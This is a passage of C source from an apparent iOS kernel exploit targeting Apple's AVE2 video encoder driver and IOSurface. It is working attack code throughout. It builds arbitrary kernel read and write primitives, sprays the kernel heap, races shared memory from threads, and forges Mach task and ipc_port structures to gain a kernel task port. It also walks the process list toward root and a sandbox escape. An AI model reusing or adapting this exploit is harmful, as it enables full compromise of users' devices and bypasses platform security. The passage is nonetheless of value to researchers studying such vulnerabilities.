        uint32_t *alert3 = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 32);
        if(*alert3){
            retdata = *alert3;
        }
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 0x8;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
    }while(!retdata || kr);
    printf("ð¤");// or it'll crash possibly");
    printf("she done?\n");// or it'll crash possibly");
    return retdata;
}

void temp_kernel_reading_insert_valid_kaddr(uint64_t target_addr){
    
    *(uint64_t*)(inputmap_InitInfo + 56) = 0;
    *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = target_addr;
    {
        char input_stru[0x28] = {0};
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        uint32_t output_stru = 0;
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
    }
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

void _temp_kernel_reading_release_mem_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 8);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    //backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    uint64_t verify_v = *alert3;
    (printf)("verify_v: 0x%llx\n", verify_v);
}

uint32_t temp_kernel_reading_release_mem(uint64_t target_addr){
    
    uint32_t retdata = 0;
    do{
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_release_mem_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *check_if_mem_been_released = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 24);
        if(*check_if_mem_been_released == 0){
            break;
        }
        
    }while(1);
    
    return retdata;
}

void prep_new_reading_primi(){
    // Have to call this everytime in prior to read
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    uint64_t forge_clientbuf_kaddr = magic_addr + 0x24000;
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    uint64_t forge_KernelFrameQueue_kaddr = forge_clientbuf_kaddr + 0x29B98;
   // usleep(500);
    char *forge_inputmap_FrameInfo = forge_KernelFrameQueue + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = forge_KernelFrameQueue_kaddr + 24;
    
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = forge_inputmap_FrameInfo_kaddr;
    
    *(uint32_t*)(forge_clientbuf + 0x8) = 0x0;
    *(forge_clientbuf + 0x27B59) = 0x0;
    
 
    *(uint64_t*)(forge_inputmap_FrameInfo + 16) = 0x4569;
    *(uint32_t*)(forge_clientbuf + 0x4FF0 + 112) = 0x1;
    *(uint64_t*)(forge_clientbuf + 0x27838) = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
}

uint32_t new_reading_primitive(uint64_t target_addr){
    
    prep_new_reading_primi();
    //printf("prep_new_reading_primi DONE\n");
    char *forge_inputmap_FrameInfo = inputmap_InitInfo + 0x24000 + 0x29B98 + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = magic_addr + 0x24000 + 0x29B98 + 24;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 20) = 0x2;
    
    uint32_t *retdata = (uint32_t*)(forge_inputmap_FrameInfo + 176);
    *retdata = 0;
    
    char *m_DPB = forge_inputmap_FrameInfo + 0x2A000;
    uint64_t m_DPB_inKernel = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    
    *(uint32_t*)(m_DPB + 20) = 1;
    *(uint32_t*)(m_DPB + 2364) = 0;
    
    char *v8 = m_DPB + 96*(0) + 728;
    uint64_t v8_inKernel = m_DPB_inKernel + 96*(0) + 728;
    
    *(uint64_t*)(v8 + 72) = v8_inKernel + 40;
    *(uint64_t*)(v8 + 80) = 0;
    *(uint64_t*)(v8 + 40) = v8_inKernel + 48 - 32;
    *(uint64_t*)(v8 + 48) = target_addr - 12;
    
    *(uint64_t*)(v8) = 0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 0x10) = 0x4569;
    *(uint32_t*)(forge_inputmap_FrameInfo + 12) = 0;
    //usleep(3000);
    *(uint32_t*)(forge_inputmap_FrameInfo + 96) = 2;
    *(uint8_t*)(forge_inputmap_FrameInfo + 13477) = 0;
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
    {
        char input_stru[0x28] = {0};
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        usleep(50);
        //printf("æ¾");

        size_t output_stru_size = 0x4;
        uint32_t output_stru = 0;
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
    }
    
    return *retdata;
}

void new_writing_primi(uint64_t target_addr, uint32_t write_data){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000; // æ¾å¨ magic mem + 0x24000çä½ç½®
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    //usleep(2000);
    //printf(".");

    //KernelFrameQueue->m_BaseAddress; // in this write prim, m_BaseAddress is the target addr we want it to be overwritten
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = target_addr - 5948;
    
    // clientbuf->UniqueClientID // in this write prim, UniqueClientID is the data we will use it to overwrite
    *(uint32_t*)(forge_clientbuf + 0x8) = write_data;

    {
        ////usleep(20000);
        //printf(".");
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
}

void build_fake_task_stru_forReadMem(char *faketask, uint64_t target_addr){
    
    *(uint32_t*)(faketask + 0x10) = 99; // ref_cnt
    
    // offset 0x368: mach task->bsd_info
    
    *(uint64_t*)(faketask + 0x368) = target_addr - 0x60;
}

void build_fake_ipc_port_stru(struct ipc_port *fakeport, uint64_t specify_kobject){
    
    struct ipc_port *_tmp = malloc(sizeof(struct ipc_port));
    bzero(_tmp, sizeof(struct ipc_port));
    
    _tmp->ip_bits = IO_BITS_ACTIVE | IKOT_TASK | IO_BITS_KOBJECT;
    _tmp->ip_references = 100;
    _tmp->ip_lock.type = 0x11;
    _tmp->ip_messages.port.receiver_name = 1;
    _tmp->ip_messages.port.msgcount = 0;
    _tmp->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    
    _tmp->ip_kobject = specify_kobject;
    _tmp->ip_receiver = ipc_space_kernel_kAddr;
    
    KernelWrite_anySize(fakeport, _tmp, sizeof(struct ipc_port));
    
}

void build_fake_task_stru_forTFP0(struct task *faketask){
    
    //KernelRead_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    struct task *_tmp = malloc(sizeof(struct task));
    bzero(_tmp, sizeof(struct task));
    
    _tmp->ref_count = 99;
    _tmp->lock.data = 0x0;
    _tmp->lock.type = 0x22;
    _tmp->active = 1;
    _tmp->pad2 = 1; // Something intro since iOS13, must not be 0, same offsets on iPhoneX and XS
    _tmp->map = kernel_map_kAddr;
    
    KernelWrite_anySize(faketask, _tmp, sizeof(struct task));
}

size_t TT1_seria_data_totalLen = 0;
uint32_t *TT1_seria_data_head = NULL;
uint64_t *TT1_spraydata = NULL;
uint32_t *TT1_seria_data_tail = NULL;

#define TT1_holes_count 20

void Init_spraydata_for_TT1(uint32_t spray_id){
    // kalloc.48
    size_t spray_entity_size = TT1_holes_count * 112;
    TT1_seria_data_totalLen = spray_entity_size + 20 + 8; // 20/8 is head/tail for seriadata format
    TT1_seria_data_head = calloc(1, TT1_seria_data_totalLen);
    TT1_spraydata = (uint64_t *)(((char*)TT1_seria_data_head) + 20);
    TT1_seria_data_tail = (uint32_t *)(((char*)TT1_seria_data_head) + spray_entity_size + 20);
    memset(TT1_spraydata, 0x77, spray_entity_size);
    
    TT1_seria_data_head[0] = spray_id;
    TT1_seria_data_head[1] = 0;
    TT1_seria_data_head[2] = kOSSerializeMagic;
    TT1_seria_data_head[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    TT1_seria_data_head[4] = kOSSerializeData | (uint32_t)spray_entity_size;
    
    TT1_seria_data_tail[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    TT1_seria_data_tail[1] = 0x1;
}

uint32_t TT1_sprayid = 0xB201;
void TT1_send_spray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    TT1_sprayid = TT1_sprayid + 1;
    
    // Start spraying
    for(int i=TT1_sprayid; i<(TT1_sprayid+1); i++){
        TT1_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT1_seria_data_head, TT1_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

size_t TT2_seria_data_totalLen = 0;
uint32_t *TT2_seria_data_head = NULL;
char *TT2_spraydata = NULL;
uint32_t *TT2_seria_data_tail = NULL;

void Init_spraydata_for_TT2(uint32_t spray_id){
    // kalloc.48
    size_t spray_entity_size = 112;
    TT2_seria_data_totalLen = spray_entity_size + 20 + 8; // 20/8 is head/tail for seriadata format
    TT2_seria_data_head = calloc(1, TT2_seria_data_totalLen);
    TT2_spraydata = (((char*)TT2_seria_data_head) + 20);
    TT2_seria_data_tail = (uint32_t *)(((char*)TT2_seria_data_head) + spray_entity_size + 20);
    
    memset(TT2_spraydata, 0x66, spray_entity_size);
    
    TT2_seria_data_head[0] = spray_id;
    TT2_seria_data_head[1] = 0;
    TT2_seria_data_head[2] = kOSSerializeMagic;
    TT2_seria_data_head[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    TT2_seria_data_head[4] = kOSSerializeData | (uint32_t)spray_entity_size;
    
    TT2_seria_data_tail[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    TT2_seria_data_tail[1] = 0x1;
}

void TT2_send_spray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=0xD205; i<0xDC00; i++){
        *(uint32_t*)(TT2_spraydata + 0x18) = i;
        TT2_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT2_seria_data_head, TT2_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

void TT2_send_spray_smallspray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=0xDC01; i<0xDD00; i++){
        *(uint32_t*)(TT2_spraydata + 0x18) = i;
        TT2_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT2_seria_data_head, TT2_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

void TT2_release_all(){
    
    for(int i=0xD205; i<0xDD00; i++){
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, i);
    }
}
int iclient =0;
uint8_t add_new_client(){
    size_t input_stru_size = 0x8;
    uint64_t input_stru = 0;
    size_t output_stru_size = 0x8;
    uint32_t output_stru[2] = {0}; // Contain clientbuf->UniqueClientID
    int kr = IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 0, &input_stru, input_stru_size, output_stru, &output_stru_size);
    // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
    //printf("  AVE AddClient kr: 0x%x(%d) clientid:0x%x|0x%x\n", kr, kr, output_stru[0], output_stru[1]);
    
    if(kr){
        
        if (iclient <8) {
            //printf("client full\n");
            iclient++;
            
            if ( iclient>=7 ) {
                printf("Closing App, Please Reboot and try again\n");
                //sleep(2);
                printf("Exploit failing to leak any info, I'll exit for you\n");
                //sleep(1);
                //return false;
                extern void ppp();ppp();
                exit(1);
                //extern void ppp();ppp();
                //exit(1);
            }
            return 1;
        }

    }
    return 0;
}

void remove_client(){
    size_t input_stru_size = 0x4;
    uint32_t unused1 = 0;
    size_t output_stru_size = 0x4;
    uint32_t unused2 = 0;
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 1, &unused1, input_stru_size, &unused2, &output_stru_size);
    // Neither output_stru or kr has used for indicates any sign of success or failure
}

void encode_client_normal(uint8_t isFor_finalCleaning){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    *(uint8_t*)(inputmap_InitInfo + 13377) = 0;
    if(isFor_finalCleaning)
        *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    else
        *(uint32_t*)(inputmap_InitInfo + 4) = 0x333;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 2;
    
    {
        char *input_stru = calloc(1, 0x110);
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
    }
}


void encode_client_normal222(){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    *(uint8_t*)(inputmap_InitInfo + 13377) = 0;
    *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 2;
    
    {
        char *input_stru = calloc(1, 0x110);
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
    }
}

void spray_client(){
    
    *(uint64_t*)(inputmap_InitInfo + 1072) = 0;
    
    pthread_t p3 = NULL;
    pthread_create(&p3, &pth_commAttr, (void*)race_kmem2, NULL);
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 2020) = 0xB0F0-31;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 0x990-31;
    *(uint32_t*)(inputmap_InitInfo + 4) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4567;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    *(uint32_t*)(inputmap_InitInfo + 96) = 39;
    *(uint32_t*)(inputmap_InitInfo + 1936) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 13292) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13388) = 5;
    
    char input_stru[0x110] = {0};
    *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId; // FrameQueue
    *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId; // InitInfo
    
    *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId; // ParameterSetsBuffer
    
    *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId; // mbComplexityMapBuffer
    
    *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId; // statsMapBuffer[0]
    *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId; // statsMapBuffer[1]
    *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId; // statsMapBuffer[2]
    *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId; // statsMapBuffer[3]
    *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId; // statsMapBuffer[4]
    
    *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId; // codedOutputBuffer[0]
    *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId; // codedOutputBuffer[1]
    *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId; // codedOutputBuffer[2]
    *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId; // codedOutputBuffer[3]
    *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId; // codedOutputBuffer[4]
    
    *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId; // xCodeOutputBuffer[0]
    *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId; // xCodeOutputBuffer[1]
    
    *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId; // codedHeaderBuffer [0] *Must Specify
    *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId; // codedHeaderBuffer [1] *Must Specify
    *(uint32_t*)(input_stru + 220) = InitInfo_surfaceId; // codedHeaderBuffer [2]
    *(uint32_t*)(input_stru + 224) = InitInfo_surfaceId; // codedHeaderBuffer [3]
    *(uint32_t*)(input_stru + 228) = InitInfo_surfaceId; // codedHeaderBuffer [4]
    
    *(uint32_t*)(input_stru + 232) = InitInfo_surfaceId; // sliceHeaderBuffer[0]
    *(uint32_t*)(input_stru + 236) = InitInfo_surfaceId; // sliceHeaderBuffer[1]
    *(uint32_t*)(input_stru + 240) = InitInfo_surfaceId; // sliceHeaderBuffer[2]
    *(uint32_t*)(input_stru + 244) = InitInfo_surfaceId; // sliceHeaderBuffer[3]
    *(uint32_t*)(input_stru + 248) = InitInfo_surfaceId; // sliceHeaderBuffer[4]
    
    *(uint32_t*)(input_stru + 48) = InitInfo_surfaceId; // userDPBBuffer[0][0] ioSurface
    *(uint32_t*)(input_stru + 52) = InitInfo_surfaceId; // userDPBBuffer[0][1] ioSurface
    *(uint32_t*)(input_stru + 56) = InitInfo_surfaceId; // userDPBBuffer[1][0] ioSurface
    *(uint32_t*)(input_stru + 60) = InitInfo_surfaceId; // userDPBBuffer[1][1] ioSurface
    *(uint32_t*)(input_stru + 64) = InitInfo_surfaceId; // userDPBBuffer[2][0] ioSurface
    *(uint32_t*)(input_stru + 68) = InitInfo_surfaceId; // userDPBBuffer[2][1] ioSurface
    *(uint32_t*)(input_stru + 72) = InitInfo_surfaceId; // userDPBBuffer[3][0] ioSurface
    *(uint32_t*)(input_stru + 76) = InitInfo_surfaceId; // userDPBBuffer[3][1] ioSurface
    *(uint32_t*)(input_stru + 80) = InitInfo_surfaceId; // userDPBBuffer[4][0] ioSurface
    *(uint32_t*)(input_stru + 84) = InitInfo_surfaceId; // userDPBBuffer[4][1] ioSurface
    *(uint32_t*)(input_stru + 88) = InitInfo_surfaceId; // userDPBBuffer[5][0] ioSurface
    *(uint32_t*)(input_stru + 92) = InitInfo_surfaceId; // userDPBBuffer[5][1] ioSurface
    *(uint32_t*)(input_stru + 96) = InitInfo_surfaceId; // userDPBBuffer[6][0] ioSurface
    *(uint32_t*)(input_stru + 100) = InitInfo_surfaceId; // userDPBBuffer[6][1] ioSurface
    *(uint32_t*)(input_stru + 104) = InitInfo_surfaceId; // userDPBBuffer[7][0] ioSurface
    *(uint32_t*)(input_stru + 108) = InitInfo_surfaceId; // userDPBBuffer[7][1] ioSurface
    *(uint32_t*)(input_stru + 112) = InitInfo_surfaceId; // userDPBBuffer[8][0] ioSurface
    *(uint32_t*)(input_stru + 116) = InitInfo_surfaceId; // userDPBBuffer[8][1] ioSurface
    *(uint32_t*)(input_stru + 120) = InitInfo_surfaceId; // userDPBBuffer[9][0] ioSurface
    *(uint32_t*)(input_stru + 124) = InitInfo_surfaceId; // userDPBBuffer[9][1] ioSurface
    *(uint32_t*)(input_stru + 128) = InitInfo_surfaceId; // userDPBBuffer[10][0] ioSurface
    *(uint32_t*)(input_stru + 132) = InitInfo_surfaceId; // userDPBBuffer[10][1] ioSurface
    *(uint32_t*)(input_stru + 136) = InitInfo_surfaceId; // userDPBBuffer[11][0] ioSurface
    *(uint32_t*)(input_stru + 140) = InitInfo_surfaceId; // userDPBBuffer[11][1] ioSurface
    *(uint32_t*)(input_stru + 144) = InitInfo_surfaceId; // userDPBBuffer[12][0] ioSurface
    *(uint32_t*)(input_stru + 148) = InitInfo_surfaceId; // userDPBBuffer[12][1] ioSurface
    *(uint32_t*)(input_stru + 152) = InitInfo_surfaceId; // userDPBBuffer[13][0] ioSurface
    *(uint32_t*)(input_stru + 156) = InitInfo_surfaceId; // userDPBBuffer[13][1] ioSurface
    *(uint32_t*)(input_stru + 160) = InitInfo_surfaceId; // userDPBBuffer[14][0] ioSurface
    *(uint32_t*)(input_stru + 164) = InitInfo_surfaceId; // userDPBBuffer[14][1] ioSurface
    *(uint32_t*)(input_stru + 168) = InitInfo_surfaceId; // userDPBBuffer[15][0] ioSurface
    *(uint32_t*)(input_stru + 172) = InitInfo_surfaceId; // userDPBBuffer[15][1] ioSurface
    *(uint32_t*)(input_stru + 176) = InitInfo_surfaceId; // userDPBBuffer[16][0] ioSurface
    *(uint32_t*)(input_stru + 180) = InitInfo_surfaceId; // userDPBBuffer[16][1] ioSurface
    
    *(uint8_t*)(input_stru + 256) = 1;
    *(uint64_t*)(input_stru + 264) = 0x2222222222222222;
    
    size_t output_stru_size = 4;
    char output_stru[4] = {0};
    
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
}

uint8_t check_if_valid_kernel_ptr(uint64_t target_ptr){
    if(((target_ptr >> 32) & 0xFFFFFFF0) == 0xFFFFFFF0)
        return 1;
    return 0;
}

uint64_t find_proc_byPID(pid_t target_pid) {
    
    uint64_t found_proc = KernelRead_8bytes(HARDCODED_allproc + kaslr);
    while(1){
        // this loop start from the most recent new proc
        if(!found_proc)
            break;
        
        pid_t pid_i = KernelRead_4bytes(found_proc + OFFSET_bsd_info_pid13);
        
        if(target_pid == pid_i)
            break;
        
        found_proc = KernelRead_8bytes(found_proc);
    }
    return found_proc;
}

#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

/*pid_t look_for_proc(char *proc_name){
    
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000){
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        ////usleep(100);
        if(pids[i] == 0){continue;}
        
        bzero(pathBuffer, 4096);
        if(proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer))){
            //printf("  pid(%d): %s\n", pids[i], pathBuffer);
            if(!strcmp(proc_name, pathBuffer)){
                free(pids);
                return pids[i];
            }
        }
    }
    free(pids);
    return 0;
}*/

extern char *string_get_basename(const char *str);
/*
pid_t look_for_proc_basename(char *proc_name){
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000){
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if(pids[i] == 0){continue;}
        bzero(pathBuffer, 4096);
        if(proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer))){
            
            //extern char *string_get_basename(const char *str);
            char *ww = string_get_basename(pathBuffer);
            
            if(!strcmp(proc_name, ww)){
                free(pids);
                return pids[i];
            }
        }
    }
    free(pids);
    return 0;
}

*/

//#define printf(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
